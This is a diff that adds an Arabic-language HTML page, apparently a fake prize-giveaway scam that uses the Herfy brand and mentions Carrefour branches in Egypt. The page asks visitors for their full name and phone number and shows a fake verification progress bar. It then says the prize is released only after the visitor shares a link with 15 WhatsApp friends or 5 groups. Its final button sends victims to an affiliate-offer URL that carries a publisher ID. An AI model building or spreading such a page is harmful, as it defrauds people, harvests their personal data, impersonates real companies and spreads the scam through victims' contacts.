@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html>
+
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SA-Saudi</title>
+    <link rel="shortcut icon" type="image/png" href="https://i.imgur.com/yL15W1l.jpeg" />
+    <meta name="og:title" content="هرفي" />
+    <meta name="og:url" content="URL" />
+    <meta property="og:description" content="اضغط هنا للتسجيل" />
+    <meta property="og:image" content="https://i.imgur.com/yL15W1l.jpeg" />
+
+    <!-- thumbnail image on link share -->
+    <meta property="og:image" content="" />
+    <meta property='og:image:width' content='1200' />
+    <meta property='og:image:height' content='627' />
+
+
+    <meta name="robots" content="noindex" />
+    <meta name="theme-color" content="#ffffff" />
+    <link rel="stylesheet" href="../od-js.pages.dev/font-awesome.min.css" />
+    <link rel="shortcut icon" href="../../favicon.ico" type="image/x-icon">
+
+    <style type="text/css">
+        @import url("../od-js.pages.dev/css24478.css?family=Poppins:wght@500;700&amp;display=swap");
+        @import url("../od-js.pages.dev/droidarabicnaskh.css");
+    </style>
+    <link rel="stylesheet" href="../css/style.min.css">
+
+</head>
+
+<body>
+
+
+
+    <header style="background: #efefef;margin: 0px;margin-bottom: 0px;height: 50px;">
+        <a href="#" style="height: 7%;">
+            <img src="https://baksa.pages.dev/in/img/cdn-cgi/image/fauto/medias/logoo.png"
+                alt="" style="width: 110px;padding-top: 8px;padding-bottom: 8px;padding-right: 8px;margin-left: 5px;"
+                width="1"></a>
+    </header>
+
+    <div class="post1">
+        <div class="welcome">
+            <p><span class="amount"></span></p>
+        </div>
+        <div class="step1">
+            <center><img class="rib" src="https://i.imgur.com/iPkD8qY.jpg" style="width: 345px;margin-top: 5px;"></center>
+            <br>
+            <p class="question">الرجاء ملئ البيانات بشكل صحيح :</p><br>
+                <center><input type="text" placeholder=" الأسم بالكامل " id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 16px;width: 330px;" onkeypress="return numberonly(event);"><br><br>
+<select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
+    width: 330px;
+    height: 56px;
+">
+<option value="أختر نوع الشبكة" selected="1"> -- هل انت مقيم في مصر؟ --</option>
+<option value="1">نعم، أنا مقيم في مصر</option>
+<option value="2">لا، لست مفيم في مصر</option>
+
+</select>
+               
+<br><br>
+                <input type="tel" placeholder=" رقم الهاتف / الجوال " id="grade" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 16px;width: 330px;" onkeypress="return numberonly(event);"></center>
+            <button id="select">التالي</button>
+        </div>
+        <div class="step2">
+            <table>
+                <tbody>
+                    
+                        <th>الأسم</th>
+</tbody><tbody>
+<td id="pastname"></td>
+                                        </tbody>
+<tr><tr><tbody>
+                       <th>رقم الجوال</th></tbody>
+    <tbody><td id="pastnumber"></td>
+</tbody>
+            </table>
+            <button class="yes">تأكيد</button>
+            <button class="no">تعديل</button>
+        </div>
+        <div id="checking">
+            <p class="title">الرجاء الإنتظار قليلاً ...</p>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill"></div>
+                </div>
+                <div class="percentage center">
+                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="check"><i class="fa fa-check-circle"></i></span>
+                    <span id="percentage"></span>
+                </div>
+            </div>
+        </div>
+        <div id="share">
+            <center><img src="https://i.imgur.com/YXff5nD.png" alt="Win" style="width: 220px;"></center>
+            <p class="tip">
+                عميلنا العزيز : <br>
+                <span class="amount" id="getname"></span> , تهانينا لك !! ستصلك رسالة على رقم جوالك المسجل بالجائزة بعد
+                إتمام التعليمات ادناه :
+            </p><br>
+            <p class="tip">1 - إضغط على زر "مشاركة" الموجود فى الأسفل وارسل الرسالة الى 15 صديقا او 5 مجموعات على
+                الواتساب، ليستطيعو بدورهم الاستفادة من هذا العرض.</p>
+            <p class="tip">2 - ستصلك رسالة تلقائيا بعد امتلاء شريط التحقق الاحمر.</p>
+            <p class="tip">3 - قم بإبراز الرسالة في اي من فروع كارفور في مصر لإستلام جائزتك فوراً .</p>
+
+            <button id="whatsapp">◀ مشاركة ▶</button>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill2"></div>
+                </div>
+                <div class="percentage center">
+                    <span><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="percentage2">0%</span>
+                </div>
+            </div>
+        </div>
+        <div id="claim">
+            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
+            <p class="title">يمكنك الآن الحصول على جائزتك</p>
+            <button id="offer">اضغط هنا</button>
+
+        </div>
+    </div>
+    </div>
+
+    <script src="../od-js.pages.dev/jquery-latest.min.js"></script>
+    <script>
+        var errorname = "الرجاء إدخال الأسم بشكل صحيح!",
+            errornumber = "الرجاء ادخال الرقم الخاص بك بشكل صحيح",
+            text1 = "جوائز قيمة من هرفي",
+            link = "https://tinyurl.com/Herfy-6554",
+            error = "هناك خطأ!\nالمشاركات غير محسوبة ربما شاركته مع نفس الصديق او المجموعة اكثر من مرة، من فضلك اعد المشاركة.",
+            cpa = "https://vdbaa.com/fullpage.php?section=General&pub=127616&ga=g",
+            saved = "MAMA7lwa",
+            share = "whatsapp://send?text=" + link;
+    </script>
+
+    <script src="./js/script.min.js"></script>
+    <script src="./js/whatsapp.min.js"></script>
+</body>
+
+</html>
